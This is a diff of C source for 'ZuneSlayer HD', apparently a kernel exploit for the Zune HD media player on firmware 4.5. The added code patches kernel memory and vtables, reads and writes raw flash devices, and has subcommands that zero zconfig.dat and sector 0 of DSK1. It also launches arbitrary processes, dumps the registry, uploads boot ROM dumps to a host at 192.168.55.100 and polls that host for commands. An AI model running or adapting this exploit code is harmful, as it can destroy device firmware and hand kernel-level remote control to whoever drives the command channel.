@@ -1,4 +1,4 @@
-﻿/* 
+/* 
 	ZuneSlayer HD
 
 	Kernel Exploit for Zune HD (pavo) (offsets specific to fw v4.5)
@@ -142,7 +142,8 @@ void connection(SOCKET client) {
 	unsigned char* inbuf = (unsigned char*)calloc(INBUFSZ, 1);
 	unsigned char* out = (unsigned char*)calloc(OBUFSZ, 1);
 
-		char* c = "Helo2\n";
+		char c[64];
+		sprintf(c, "Helo2 %s %s\n", __DATE__, __TIME__);
 		if (send(client,c,strlen(c),0) == SOCKET_ERROR){
 			closesocket(client);
 			return;
@@ -268,26 +269,57 @@ void connection(SOCKET client) {
 
 				// Try opening various block device names
 				LPCWSTR dev_names[] = {
-					L"DSK1:", L"DSK2:", L"DSK3:", L"DSK4:",
-					L"FLASHDRV:", L"NAND1:", L"NAND2:",
-					L"Store:", L"Part00:", L"Part01:", L"Part02:",
-					L"\\\\.\\PhysicalDisk0",
-					NULL
+					L"ZAF1:", L"ZAF2:", L"ZAF3:",
+					L"DSK1:", L"DSK2:", L"DSK3:",
+					L"Store:", L"Part00:", L"Part01:",
+						NULL
 				};
 
 				HANDLE hDev = INVALID_HANDLE_VALUE;
 				u32 dev_idx = 0;
 
+				DWORD tcp_access = (subcmd == 1) ? (GENERIC_READ | GENERIC_WRITE) : GENERIC_READ;
 				for (int d = 0; dev_names[d] != NULL; d++) {
 					HANDLE h = CreateFileW(dev_names[d],
-						GENERIC_READ | GENERIC_WRITE, 0, NULL,
+						tcp_access, FILE_SHARE_READ, NULL,
 						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 					if (h != INVALID_HANDLE_VALUE) {
-						// Found one! Read first 512 bytes
-						unsigned char sector[512];
+						// Found one! Try multiple read methods
+						unsigned char sector[2048];
 						DWORD bytesRead = 0;
+						memset(sector, 0, sizeof(sector));
+
+						// Method 1: ReadFile
 						SetFilePointer(h, 0, NULL, FILE_BEGIN);
 						BOOL ok = ReadFile(h, sector, 512, &bytesRead, NULL);
+
+						// Method 2: DISK_IOCTL_GETINFO (0x70800) + IOCTL_DISK_READ (0x70004)
+						if (bytesRead == 0) {
+							struct { DWORD total; DWORD bps; DWORD cyl; DWORD heads; DWORD sec; DWORD flags; } di;
+							memset(&di, 0, sizeof(di));
+							DWORD ioret = 0;
+							DeviceIoControl(h, 0x00070800, NULL, 0, &di, sizeof(di), &ioret, NULL);
+							// Store geometry in out[16..27]
+							*(u32*)&out[16] = di.total;
+							*(u32*)&out[20] = di.bps;
+							*(u32*)&out[24] = di.flags;
+
+							// Try IOCTL_DISK_READ with SG_REQ
+							u32 secsize = (di.bps > 0 && di.bps <= 2048) ? di.bps : 512;
+							struct { DWORD start; DWORD num_sec; DWORD num_sg; DWORD status; DWORD callback;
+							         DWORD sb_len; unsigned char* sb_buf; } sg;
+							sg.start = 0; sg.num_sec = 1; sg.num_sg = 1; sg.status = 0; sg.callback = 0;
+							sg.sb_len = secsize; sg.sb_buf = sector;
+							ok = DeviceIoControl(h, 0x00070004, &sg, sizeof(sg), NULL, 0, &ioret, NULL);
+							if (ok) bytesRead = secsize;
+						}
+
+						// Method 3: Custom IOCTL 0x70D00
+						if (bytesRead == 0) {
+							DWORD ioret = 0;
+							ok = DeviceIoControl(h, 0x00070D00, NULL, 0, sector, 512, &ioret, NULL);
+							if (ok && ioret > 0) bytesRead = ioret;
+						}
 
 						out[1] = 1; // found a device
 						out[2] = d; // which device index
@@ -298,7 +330,7 @@ void connection(SOCKET client) {
 						// Check for ECEC in first 512 bytes
 						u32 has_ecec = 0;
 						u32 ecec_off = 0;
-						for (u32 i = 0; i < bytesRead - 3; i++) {
+						for (u32 i = 0; i + 3 < bytesRead; i++) {
 							if (sector[i] == 'E' && sector[i+1] == 'C' &&
 								sector[i+2] == 'E' && sector[i+3] == 'C') {
 								has_ecec = 1;
@@ -358,7 +390,7 @@ void connection(SOCKET client) {
 					if (safe_send(client, out, 32)) { closesocket(client); break; }
 				}
 
-			// Cmd 21: IROM full dump (64KB) — page-by-page NKCreateStaticMapping
+			// Cmd 21: IROM full dump (64KB) -- page-by-page NKCreateStaticMapping
 			// Maps each 4KB IROM page individually, reads and sends.
 			// Packet:  [21]
 			// Response: [21][1][pages_ok:1] then up to 64KB of data
@@ -1016,6 +1048,364 @@ u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) |
 }
 
 
+			// Cmd 26: Flash sector read via zargsflash vtable patch
+			// Patches the lock function to bypass exclusive access, then calls IOCTL 0x100
+			// Packet: [26][count:1] (count = sectors to read, default 1, max 4)
+			} else if (inbuf[0] == 26) {
+				out[0] = 26;
+				u32 count = inbuf[1];
+				if (count == 0) count = 1;
+				if (count > 4) count = 4;
+
+				// zargsflash vtable[0x17] at 0xC0AD205C = lock function
+				// zpartstream IOControl at 0xC0AE1300 = "mov r0, #0; bx lr"
+				u32 vtable_addr = 0xC0AD205C;
+				u32 return0_addr = 0xC0AE1300;
+
+				// Save and patch vtable
+				u32 old_lock_fn = kreadu32(vtable_addr);
+				kwr(vtable_addr, return0_addr);
+
+				// Open ZAF1:
+				HANDLE hZaf = CreateFileW(L"ZAF1:", 0,
+					FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+					OPEN_EXISTING, 0, NULL);
+
+				if (hZaf == INVALID_HANDLE_VALUE) {
+					out[1] = 0;
+					*(u32*)&out[4] = GetLastError();
+					kwr(vtable_addr, old_lock_fn);
+					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+				} else {
+					out[1] = 1;
+
+					// IOCTL 0x100 input: {ptr0, ptr1, ptr2, count}
+					unsigned char* data_buf = (unsigned char*)calloc(2048 * count, 1);
+					unsigned char* spare_buf = (unsigned char*)calloc(2048, 1);
+					unsigned char* status_buf = (unsigned char*)calloc(count, 1);
+
+					DWORD ioctl_input[4];
+					ioctl_input[0] = (DWORD)data_buf;
+					ioctl_input[1] = (DWORD)spare_buf;
+					ioctl_input[2] = (DWORD)status_buf;
+					ioctl_input[3] = count;
+
+					DWORD ret = 0;
+					BOOL ok = DeviceIoControl(hZaf, 0x100, ioctl_input, 16, NULL, 0, &ret, NULL);
+					DWORD err = ok ? 0 : GetLastError();
+
+					out[2] = ok ? 1 : 0;
+					*(u32*)&out[4] = err;
+					*(u32*)&out[8] = count;
+					*(u32*)&out[12] = ret;
+
+					u32 data_nz = 0;
+					for (u32 i = 0; i < 2048 * count; i++)
+						if (data_buf[i] != 0) data_nz++;
+					*(u32*)&out[16] = data_nz;
+
+					u32 ecec_off = 0xFFFFFFFF;
+					for (u32 i = 0; i + 3 < 2048 * count; i++) {
+						if (data_buf[i]=='E' && data_buf[i+1]=='C' &&
+						    data_buf[i+2]=='E' && data_buf[i+3]=='C') {
+							ecec_off = i;
+							break;
+						}
+					}
+					*(u32*)&out[20] = ecec_off;
+
+					CloseHandle(hZaf);
+					kwr(vtable_addr, old_lock_fn);
+
+					if (safe_send(client, (unsigned char*)out, 32)) {
+						free(data_buf); free(spare_buf); free(status_buf);
+						closesocket(client); break;
+					}
+					if (safe_send(client, data_buf, 2048 * count)) {
+						free(data_buf); free(spare_buf); free(status_buf);
+						closesocket(client); break;
+					}
+
+					free(data_buf);
+					free(spare_buf);
+					free(status_buf);
+				}
+
+			// Cmd 27: Flash write test
+			// subcmd 0: probe write to Flash
+			// subcmd 1: backup zconfig.dat
+			// subcmd 2: corrupt zconfig.dat
+			// subcmd 3: raw write DSK1 sector 0
+			} else if (inbuf[0] == 27) { {
+				HANDLE hf27;
+				DWORD written27, err27, bytesRead27, fsize27, ret27;
+				BOOL wok27, ok27;
+				unsigned char* fbuf27;
+				u32 subcmd27 = inbuf[1];
+				out[0] = 27;
+
+				if (subcmd27 == 0) {
+					// Probe: write a test file to Flash partition
+					hf27 = CreateFileW(L"\\Flash\\zuneslayer_test.tmp",
+						0x40000000, 0, NULL, 2, 0x80, NULL);
+					if (hf27 != INVALID_HANDLE_VALUE) {
+						char testdata[] = "zuneslayer write test";
+						written27 = 0;
+						wok27 = WriteFile(hf27, testdata, sizeof(testdata), &written27, NULL);
+						CloseHandle(hf27);
+						out[1] = 1;
+						out[2] = wok27 ? 1 : 0;
+						*(u32*)&out[4] = written27;
+						// Delete it
+						DeleteFileW(L"\\Flash\\zuneslayer_test.tmp");
+					} else {
+						out[1] = 0;
+						*(u32*)&out[4] = GetLastError();
+					}
+					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+
+				} else if (subcmd27 == 1) {
+					// Backup: read zconfig.dat
+					hf27 = CreateFileW(L"\\Flash\\zconfig.dat",
+						GENERIC_READ, FILE_SHARE_READ, NULL,
+						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+					if (hf27 != INVALID_HANDLE_VALUE) {
+						fsize27 = GetFileSize(hf27, NULL);
+						fbuf27 = (unsigned char*)calloc(fsize27 + 1, 1);
+						bytesRead27 = 0;
+						ReadFile(hf27, fbuf27, fsize27, &bytesRead27, NULL);
+						CloseHandle(hf27);
+						out[1] = 1;
+						*(u32*)&out[4] = bytesRead27;
+						if (safe_send(client, (unsigned char*)out, 32)) {
+							free(fbuf27); closesocket(client); break;
+						}
+						if (safe_send(client, fbuf27, bytesRead27)) {
+							free(fbuf27); closesocket(client); break;
+						}
+						free(fbuf27);
+					} else {
+						out[1] = 0;
+						*(u32*)&out[4] = GetLastError();
+						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+					}
+
+				} else if (subcmd27 == 2) {
+					// Corrupt: write zeros to first 512 bytes of zconfig.dat
+					hf27 = CreateFileW(L"\\Flash\\zconfig.dat",
+						0x40000000, 0, NULL,
+						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+					if (hf27 != INVALID_HANDLE_VALUE) {
+						unsigned char zeros[512];
+						memset(zeros, 0, 512);
+						written27 = 0;
+						SetFilePointer(hf27, 0, NULL, FILE_BEGIN);
+						wok27 = WriteFile(hf27, zeros, 512, &written27, NULL);
+						err27 = wok27 ? 0 : GetLastError();
+						CloseHandle(hf27);
+						out[1] = 1;
+						out[2] = wok27 ? 1 : 0;
+						*(u32*)&out[4] = err27;
+						*(u32*)&out[8] = written27;
+					} else {
+						out[1] = 0;
+						*(u32*)&out[4] = GetLastError();
+					}
+					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+
+				} else if (subcmd27 == 3) {
+					// Raw write: IOCTL 3 on DSK1: sector 0
+					HANDLE hDsk27 = CreateFileW(L"DSK1:", GENERIC_READ | GENERIC_WRITE,
+						FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+						OPEN_EXISTING, 0, NULL);
+					if (hDsk27 != INVALID_HANDLE_VALUE) {
+						// Write zeros to sector 0 via IOCTL 3 (DISK_IOCTL_WRITE)
+						unsigned char* secbuf = (unsigned char*)calloc(2048, 1);
+						struct { DWORD start; DWORD num_sec; DWORD num_sg; DWORD status;
+						         DWORD callback; DWORD sb_buf; DWORD sb_len; } sg;
+						sg.start = 0; sg.num_sec = 1; sg.num_sg = 1; sg.status = 0;
+						sg.callback = 0; sg.sb_buf = (DWORD)secbuf; sg.sb_len = 2048;
+						ret27 = 0;
+						ok27 = DeviceIoControl(hDsk27, 3, &sg, sizeof(sg), NULL, 0, &ret27, NULL);
+						err27 = ok27 ? 0 : GetLastError();
+						CloseHandle(hDsk27);
+						out[1] = 1;
+						out[2] = ok27 ? 1 : 0;
+						*(u32*)&out[4] = err27;
+						*(u32*)&out[8] = sg.status;
+						free(secbuf);
+					} else {
+						out[1] = 0;
+						*(u32*)&out[4] = GetLastError();
+					}
+					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+
+				} else if (subcmd27 == 4) {
+					// PMC reboot to recovery (APX mode)
+					// Map PMC via NKCreateStaticMapping (PA 0x7000E000, 1 page)
+					// PMC base at PA 0x7000E400 = mapped + 0x400
+					// PMC_CNTRL at PMC+0x00, PMC_SCRATCH0 at PMC+0x50
+					HMODULE mhPmc = GetModuleHandleW(L"coredll.dll");
+
+					// Step 1: Map PMC page
+					kwr(0x80060da0, 0x80069de0); // redirect to NKCreateStaticMapping
+					CSM csmPmc = (CSM) GetProcAddress(mhPmc, L"GetFSHeapInfo");
+					DWORD pmc_map = (DWORD)csmPmc(0x7000E000 >> 8, 1); // map 1 page
+					kwr(0x80060da0, 0x80015020); // restore to kreadb
+					KFSH ghiPmc = (KFSH) GetProcAddress(mhPmc, L"GetFSHeapInfo");
+
+					if (pmc_map == 0) {
+						out[1] = 0;
+						*(u32*)&out[4] = 0xDEAD0001; // mapping failed
+						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+					} else {
+						// PMC base within mapped page: offset 0x400
+						DWORD pmc_base = pmc_map + 0x400;
+
+						// Step 2: Read current SCRATCH0
+						u32 scratch0 = (u32)ghiPmc(pmc_base + 0x50, 0, 0x1338);
+						scratch0 |= ((u32)ghiPmc(pmc_base + 0x51, 0, 0x1338)) << 8;
+						scratch0 |= ((u32)ghiPmc(pmc_base + 0x52, 0, 0x1338)) << 16;
+						scratch0 |= ((u32)ghiPmc(pmc_base + 0x53, 0, 0x1338)) << 24;
+
+						out[1] = 1; // mapped ok
+						*(u32*)&out[4] = pmc_map;
+						*(u32*)&out[8] = scratch0;
+
+						// Read PMC_CNTRL too
+						u32 pmc_cntrl = (u32)ghiPmc(pmc_base + 0x00, 0, 0x1338);
+						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x01, 0, 0x1338)) << 8;
+						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x02, 0, 0x1338)) << 16;
+						pmc_cntrl |= ((u32)ghiPmc(pmc_base + 0x03, 0, 0x1338)) << 24;
+						*(u32*)&out[12] = pmc_cntrl;
+
+						// If inbuf[2] == 0x42 (magic confirm byte), actually do the reboot
+						if (inbuf[2] == 0x42) {
+							// Write recovery flag to SCRATCH0 (set bit 1)
+							kwr(pmc_base + 0x50, scratch0 | 0x02);
+							// Trigger system reset: set bit 4 of PMC_CNTRL
+							kwr(pmc_base + 0x00, pmc_cntrl | 0x10);
+							// If we get here, reset didn't work
+							out[16] = 0xFF;
+						} else {
+							out[16] = 0; // dry run, no reboot
+						}
+
+						if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+					}
+				}
+
+			} // end cmd 27 inner scope
+
+			// Cmd 23: Registry dump
+			} else if (inbuf[0] == 23) {
+				out[0] = 23;
+				WCHAR regpath[128];
+				memset(regpath, 0, sizeof(regpath));
+				// ASCII path from inbuf[1..31]
+				for (int i = 0; i < 30 && inbuf[1+i]; i++)
+					regpath[i] = (WCHAR)inbuf[1+i];
+
+				HKEY hk;
+				LONG rc = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regpath, 0, KEY_READ, &hk);
+				out[1] = (rc == ERROR_SUCCESS) ? 1 : 0;
+				*(u32*)&out[4] = (u32)rc;
+
+				u32 off = 32;
+				if (rc == ERROR_SUCCESS) {
+					WCHAR name[128];
+					for (DWORD i = 0; ; i++) {
+						DWORD nlen = 128;
+						if (RegEnumKeyExW(hk, i, name, &nlen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
+						for (DWORD j = 0; j < nlen && off < 0xF000; j++)
+							out[off++] = (unsigned char)(name[j] & 0x7F);
+						if (off < 0xF000) out[off++] = '\n';
+					}
+					if (off < 0xF000) { out[off++] = '-'; out[off++] = '\n'; }
+					BYTE valdata[256];
+					for (DWORD i = 0; ; i++) {
+						DWORD nlen = 128, dlen = 256, type = 0;
+						if (RegEnumValueW(hk, i, name, &nlen, NULL, &type, valdata, &dlen) != ERROR_SUCCESS) break;
+						for (DWORD j = 0; j < nlen && off < 0xEF00; j++)
+							out[off++] = (unsigned char)(name[j] & 0x7F);
+						out[off++] = '=';
+						out[off++] = '0' + (type % 10);
+						out[off++] = ':';
+						for (DWORD j = 0; j < dlen && j < 64 && off < 0xEF80; j++) {
+							out[off++] = "0123456789abcdef"[valdata[j] >> 4];
+							out[off++] = "0123456789abcdef"[valdata[j] & 0xF];
+						}
+						if (off < 0xF000) out[off++] = '\n';
+					}
+					RegCloseKey(hk);
+				}
+
+				if (safe_send(client, (unsigned char*)out, off)) { closesocket(client); break; }
+
+			// Cmd 25: IOCTL probe on ZAF1:
+			// Sends a range of IOCTLs and reports which succeed
+			// inbuf[1..4] = start IOCTL, inbuf[5..8] = end IOCTL, inbuf[9..12] = step
+			} else if (inbuf[0] == 25) {
+				out[0] = 25;
+				HANDLE h = CreateFileW(L"ZAF1:", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+					OPEN_EXISTING, 0, NULL);
+				if (h == INVALID_HANDLE_VALUE) {
+					out[1] = 0;
+					*(u32*)&out[4] = GetLastError();
+					if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+				} else {
+					u32 ioctl_start = *(u32*)&inbuf[1];
+					u32 ioctl_end = *(u32*)&inbuf[5];
+					u32 ioctl_step = *(u32*)&inbuf[9];
+					if (ioctl_step == 0) ioctl_step = 4;
+					if (ioctl_end == 0) ioctl_end = ioctl_start + 0x100;
+
+					u32 off = 32;
+					u32 n_found = 0;
+					unsigned char* iobuf = (unsigned char*)calloc(512, 1);
+					unsigned char* inbuf2 = (unsigned char*)calloc(512, 1);
+					for (u32 code = ioctl_start; code < ioctl_end && off < 0xF000; code += ioctl_step) {
+						DWORD ret = 0;
+						memset(iobuf, 0, 512);
+						BOOL ok = DeviceIoControl(h, code, inbuf2, 512, iobuf, 512, &ret, NULL);
+						if (ok || ret > 0) {
+							*(u32*)&out[off] = code;
+							*(u32*)&out[off+4] = ret;
+							out[off+8] = ok ? 1 : 0;
+							// First 8 bytes of output
+							memcpy(&out[off+9], iobuf, 8);
+							off += 20;
+							n_found++;
+						}
+					}
+					out[1] = 1;
+					*(u32*)&out[4] = n_found;
+					free(iobuf);
+					free(inbuf2);
+					CloseHandle(h);
+					if (safe_send(client, (unsigned char*)out, off)) { closesocket(client); break; }
+				}
+
+			// Cmd 24: Launch process
+			} else if (inbuf[0] == 24) {
+				out[0] = 24;
+				WCHAR exepath[128];
+				WCHAR cmdline[64];
+				memset(exepath, 0, sizeof(exepath));
+				memset(cmdline, 0, sizeof(cmdline));
+				// exe path from inbuf[1..] until null
+				int p = 0;
+				for (int i = 0; i < 30 && inbuf[1+i]; i++)
+					exepath[p++] = (WCHAR)inbuf[1+i];
+
+				PROCESS_INFORMATION pi;
+				memset(&pi, 0, sizeof(pi));
+				BOOL ok = CreateProcessW(exepath, L"Start", NULL, NULL, FALSE, 0, NULL, NULL, NULL, &pi);
+				out[1] = ok ? 1 : 0;
+				*(u32*)&out[4] = ok ? pi.dwProcessId : GetLastError();
+
+				if (safe_send(client, (unsigned char*)out, 32)) { closesocket(client); break; }
+
 			} else {
 				out[0] = 0xFF;
 				if (safe_send(client,(unsigned char*)out, 32)){
@@ -1025,6 +1415,90 @@ u32 val = ((u32)inbuf[9]) | ((u32)(inbuf[10] << 8)) | ((u32)(inbuf[11] << 16)) |
 			}
 		}
 
+}
+
+static int http_post(const char* path, unsigned char* data, u32 len) {
+	SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
+	if (hs == INVALID_SOCKET) return -1;
+	SOCKADDR_IN ha;
+	ha.sin_family = AF_INET;
+	ha.sin_port = htons(8080);
+	ha.sin_addr.s_addr = inet_addr("192.168.55.100");
+	int result = -2;
+	if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
+		char hdr[256];
+		sprintf(hdr, "POST %s HTTP/1.0\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\nConnection: close\r\n\r\n", path, len);
+		send(hs, hdr, strlen(hdr), 0);
+		send(hs, (char*)data, len, 0);
+		char resp[64];
+		recv(hs, resp, 64, 0);
+		result = 0;
+	}
+	closesocket(hs);
+	return result;
+}
+
+// HTTP GET -- returns body length, or -1 on error, 0 on 204/empty
+// Streams response directly into out_buf (supports large downloads)
+static int http_get(const char* path, unsigned char* out_buf, u32 out_max) {
+	SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
+	if (hs == INVALID_SOCKET) return -1;
+	SOCKADDR_IN ha;
+	ha.sin_family = AF_INET;
+	ha.sin_port = htons(8080);
+	ha.sin_addr.s_addr = inet_addr("192.168.55.100");
+	int result = -2;
+	if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
+		char hdr[256];
+		sprintf(hdr, "GET %s HTTP/1.0\r\nConnection: close\r\n\r\n", path);
+		send(hs, hdr, strlen(hdr), 0);
+
+		// Read HTTP header first (up to 1024 bytes, look for \r\n\r\n)
+		char hbuf[1024];
+		int hlen = 0;
+		int header_end = -1;
+		while (hlen < (int)sizeof(hbuf)) {
+			int n = recv(hs, hbuf + hlen, 1, 0);
+			if (n <= 0) break;
+			hlen += n;
+			if (hlen >= 4 &&
+				hbuf[hlen-4]=='\r' && hbuf[hlen-3]=='\n' &&
+				hbuf[hlen-2]=='\r' && hbuf[hlen-1]=='\n') {
+				header_end = hlen;
+				break;
+			}
+		}
+
+		if (header_end < 0) { closesocket(hs); return -3; }
+
+		// Parse status code from "HTTP/1.0 NNN"
+		int status = 0;
+		if (hlen > 12) {
+			for (int i = 9; i < 12; i++)
+				status = status * 10 + (hbuf[i] - '0');
+		}
+
+		if (status == 204) {
+			result = 0;
+		} else if (status == 200) {
+			// Read body directly into out_buf
+			u32 got = 0;
+			int n;
+			while (got < out_max && (n = recv(hs, (char*)out_buf + got, out_max - got, 0)) > 0) {
+				got += n;
+			}
+			result = (int)got;
+		} else {
+			result = -status;
+		}
+	}
+	closesocket(hs);
+	return result;
+}
+
+// HTTP POST response (convenience for command responses)
+static int http_post_response(unsigned char* data, u32 len) {
+	return http_post("/cmd/response", data, len);
 }
 
 DWORD Server(void* sd_) {
@@ -1043,81 +1517,320 @@ DWORD Server(void* sd_) {
 			return 0;
 		}
 
-	// Copy self to \Flash2\payload.exe — must happen after hax() for kernel privs
+	// Copy self to \Flash2\payload.exe -- must happen after hax() for kernel privs
 	CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false);
 
 	ZDKSystem_ShowMessageBox(getIpAddress(), MESSAGEBOX_TYPE_OK);
 
 	int bind_ok = 0;
+	int reuse = 1;
+	setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
 	if (bind(sd, (LPSOCKADDR)&addr, sizeof(addr)) != SOCKET_ERROR) {
 		if (listen(sd, 5) != SOCKET_ERROR) {
 			bind_ok = 1;
 		}
 	}
 
-	// Auto-upload IROM dump via raw Winsock HTTP POST to PC
+	// Auto-upload IROM page 0 only (pages 1-15 cause data abort due to PIROM_DISABLE)
 	{
 		HMODULE mhA = GetModuleHandleW(L"coredll.dll");
 
-		// Map IROM page 0
-		kwr(0x80060da0, 0x80069de0);
-		CSM csmA = (CSM) GetProcAddress(mhA, L"GetFSHeapInfo");
-		DWORD irom_mapA = (DWORD)csmA(0xFFF00000 >> 8, 1);
-		kwr(0x80060da0, 0x80015020);
-		KFSH ghiA = (KFSH) GetProcAddress(mhA, L"GetFSHeapInfo");
+		for (u32 page = 0; page < 1; page++) {
+			u32 page_phys = 0xFFF00000 + page * 0x1000;
 
-		if (irom_mapA) {
+			// Map this single IROM page
+			kwr(0x80060da0, 0x80069de0);
+			CSM csmA = (CSM) GetProcAddress(mhA, L"GetFSHeapInfo");
+			DWORD irom_mapA = (DWORD)csmA(page_phys >> 8, 1);
+			kwr(0x80060da0, 0x80015020);
+			KFSH ghiA = (KFSH) GetProcAddress(mhA, L"GetFSHeapInfo");
+
+			if (!irom_mapA) continue;
+
 			// Read 4KB
 			unsigned char irom_buf[4096];
 			for (u32 i = 0; i < 4096; i++) {
 				irom_buf[i] = (unsigned char)ghiA(irom_mapA + i, 0, 0x1338);
 			}
 
-			// POST via raw Winsock
-			SOCKET hs = socket(AF_INET, SOCK_STREAM, 0);
-			if (hs != INVALID_SOCKET) {
-				SOCKADDR_IN ha;
-				ha.sin_family = AF_INET;
-				ha.sin_port = htons(8080);
-				ha.sin_addr.s_addr = inet_addr("192.168.55.100");
-				if (connect(hs, (LPSOCKADDR)&ha, sizeof(ha)) == 0) {
-					// Send HTTP POST header + body
-					char hdr[256];
-					sprintf(hdr, "POST /upload/irom.bin HTTP/1.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 4096\r\nConnection: close\r\n\r\n");
-					send(hs, hdr, strlen(hdr), 0);
-					send(hs, (char*)irom_buf, 4096, 0);
-					// Read response (don't care about content)
-					char resp[256];
-					recv(hs, resp, 256, 0);
-				}
-				closesocket(hs);
-			}
+			// Upload as irom_pageNN.bin
+			char path[64];
+			sprintf(path, "/upload/irom_page%02d.bin", page);
+			http_post(path, irom_buf, 4096);
 		}
 	}
 
-	// Try reverse-connect to PC over USB (192.168.55.100:1337) first
+	// Also probe block devices and upload sector 0 (for BCT analysis)
 	{
-		SOCKET rc = socket(AF_INET, SOCK_STREAM, 0);
-		if (rc != INVALID_SOCKET) {
-			SOCKADDR_IN pc_addr;
-			pc_addr.sin_family = AF_INET;
-			pc_addr.sin_port = htons(1337);
-			pc_addr.sin_addr.s_addr = inet_addr("192.168.55.100");
-			if (connect(rc, (LPSOCKADDR)&pc_addr, sizeof(pc_addr)) == 0) {
-				// Connected to PC via USB!
-				connection(rc);
-				closesocket(rc);
-			} else {
-				closesocket(rc);
+		LPCWSTR dev_names[] = {
+			L"DSK1:", L"DSK2:", L"DSK3:", L"DSK4:",
+			L"FLASHDRV:", L"NAND1:", L"NAND2:",
+			L"Store:", L"Part00:", L"Part01:", L"Part02:",
+			NULL
+		};
+
+		for (int d = 0; dev_names[d] != NULL; d++) {
+			HANDLE h = CreateFileW(dev_names[d],
+				GENERIC_READ, FILE_SHARE_READ, NULL,
+				OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (h != INVALID_HANDLE_VALUE) {
+				unsigned char sector[512];
+				DWORD bytesRead = 0;
+				SetFilePointer(h, 0, NULL, FILE_BEGIN);
+				ReadFile(h, sector, 512, &bytesRead, NULL);
+				CloseHandle(h);
+
+				if (bytesRead > 0) {
+					char path[64];
+					sprintf(path, "/upload/blkdev_%d_sector0.bin", d);
+					http_post(path, sector, bytesRead);
+				}
+				break; // use first accessible device
 			}
 		}
 	}
 
-	// Accept loop (WiFi) — only if bind succeeded
+	// Skip reverse-connect to PC:1337 -- it blocks the HTTP polling loop.
+	// The HTTP command channel (/cmd/poll) replaces this for USB mode.
+
+	// Accept loop (WiFi) -- only if bind succeeded
 	if (bind_ok) {
 		while(!dead) {
 			client = accept(sd,NULL,NULL);
 			connection(client);
+		}
+	}
+
+	// HTTP command polling loop -- works over USB (device→PC only)
+	// Polls httpserv at 192.168.55.100:8080 for commands
+	{
+		HMODULE mh = GetModuleHandleW(L"coredll.dll");
+		unsigned char cmd[32];
+		unsigned char resp[8192];
+
+		while (!dead) {
+			Sleep(500);
+
+			int n = http_get("/cmd/poll", cmd, 32);
+			if (n < 32) continue; // no command or error
+
+			// Process command -- same IDs as TCP protocol
+			memset(resp, 0, sizeof(resp));
+			resp[0] = cmd[0]; // echo command ID
+			u32 resp_len = 32;
+
+			if (cmd[0] == 1) {
+				// kread_u32(addr)
+				u32 addr = *(u32*)&cmd[4];
+				kwr(0x80060da0, 0x80015020);
+				KFSH ghi = (KFSH) GetProcAddress(mh, L"GetFSHeapInfo");
+				u32 val = (u32)ghi(addr, 0, 0x1338);
+				*(u32*)&resp[4] = val;
+				resp[1] = 1; // success
+
+			} else if (cmd[0] == 20) {
+				// kwrite_u32(addr, val)
+				u32 addr = *(u32*)&cmd[4];
+				u32 val = *(u32*)&cmd[8];
+				kwr(addr, val);
+				resp[1] = 1;
+
+			} else if (cmd[0] == 22) {
+				// BCT probe/corrupt -- subcmd 0=scan all devices, 1=corrupt
+				// Response: [22][n_found][...per-device results...]
+				// Appended: for each device that opened, 512-byte sector
+				u32 subcmd = cmd[1];
+				LPCWSTR dev_names[] = {
+					L"ZAF1:", L"ZAF2:", L"ZAF3:",
+					L"DSK1:", L"DSK2:", L"DSK3:",
+					L"Store:", L"Part00:", L"Part01:",
+					L"\\Flash2\\ZBoot",
+					L"\\Windows\\ZBoot",
+					NULL
+				};
+
+				u32 n_found = 0;
+				u32 best_dev = 0xFF;
+				u32 best_ecec_off = 0;
+				resp_len = 32;
+
+				for (int d = 0; dev_names[d] != NULL; d++) {
+					DWORD access = (subcmd == 1) ? (GENERIC_READ | GENERIC_WRITE) : GENERIC_READ;
+					HANDLE h = CreateFileW(dev_names[d],
+						access, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+						OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+					if (h == INVALID_HANDLE_VALUE) continue;
+
+					unsigned char sector[2048];
+					DWORD bytesRead = 0;
+					memset(sector, 0, 2048);
+					SetFilePointer(h, 0, NULL, FILE_BEGIN);
+					BOOL ok = ReadFile(h, sector, 2048, &bytesRead, NULL);
+					DWORD readErr = ok ? 0 : GetLastError();
+
+					// If ReadFile with 2048 returned 0, try 512
+					if (bytesRead == 0) {
+						SetFilePointer(h, 0, NULL, FILE_BEGIN);
+						ok = ReadFile(h, sector, 512, &bytesRead, NULL);
+						readErr = ok ? 0 : GetLastError();
+					}
+
+					// Pack per-device info: [idx][ok][bytesRead_lo][bytesRead_hi][err_lo][err_hi]
+					if (n_found < 4) {
+						u32 off = 4 + n_found * 6;
+						resp[off] = d;
+						resp[off+1] = ok ? 1 : 0;
+						resp[off+2] = bytesRead & 0xFF;
